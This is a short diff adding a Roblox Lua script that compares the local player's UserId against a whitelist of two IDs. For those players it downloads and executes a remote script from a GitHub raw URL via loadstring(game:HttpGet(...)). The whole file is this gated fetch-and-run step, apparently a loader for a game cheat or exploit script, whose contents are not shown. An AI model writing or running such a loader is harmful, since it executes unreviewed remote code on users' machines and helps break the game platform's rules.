@@ -1,0 +1,13 @@
+local PlayerTable = {
+    387520047,
+    259182826,
+}
+
+for i,v in pairs(PlayerTable) do
+    if game.Players.LocalPlayer.UserId == v then
+        print("working")
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/KosstiaPlay25/test/main/gpo"))()
+    else
+    
+    end    
+end
